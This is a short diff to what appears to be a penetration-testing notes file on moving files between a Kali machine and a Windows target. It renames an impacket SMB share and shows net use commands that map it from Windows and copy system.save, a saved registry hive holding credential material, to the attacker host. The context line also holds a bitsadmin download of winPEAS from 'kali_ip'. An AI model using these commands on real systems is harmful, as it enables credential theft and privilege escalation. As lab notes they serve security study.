@@ -209,12 +209,12 @@ bitsadmin /transfer myJob /download /priority normal http://kali_ip/winPEAS.exe 
 #### SMB share 
 
 ```bash
-└─$ impacket-smbserver test . -smb2support -username kira -password kira   
+└─$ impacket-smbserver share . -smb2support -username kira -password kira 
 ```
 
 map and copy Win -> Kali
 ```powershell
-PS C:\Users\Public> net use m: \\192.168.xx.xxx\TEST /user:kira kira
+PS C:\Users\Public> net use m: \\192.168.xx.xxx\share /user:kira kira
 
 PS C:\Users\Public> copy system.save m:\
 ```
